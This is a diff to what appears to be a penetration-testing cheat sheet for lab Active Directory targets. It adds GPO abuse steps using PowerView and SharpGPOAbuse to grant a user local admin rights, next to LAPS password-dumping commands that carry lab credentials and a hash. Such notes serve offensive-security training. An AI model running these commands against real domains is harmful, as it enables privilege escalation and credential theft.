@@ -192,6 +192,18 @@ lapsdumper -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec -l 192.168.153.
 lapsdumper -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc host
 ldapsearch -v -c -D fmcsorley@hutch.offsec -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.153.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
+##### Abusing GPO (Group Policy Object)
+Check:
+```
+Import-Module .\PowerView.ps1
+Get-NetGPO
+Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9(gpcfilesyspath) -TargetType User -TargetName anirudh
+```
+Abuse:
+```
+./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy" (add anirudh to local admin group)
+gpupdate /force
+```
 ### Authentication
 ###### Minikatz(require local admin)
 Load DemoEXE and run it locally.  
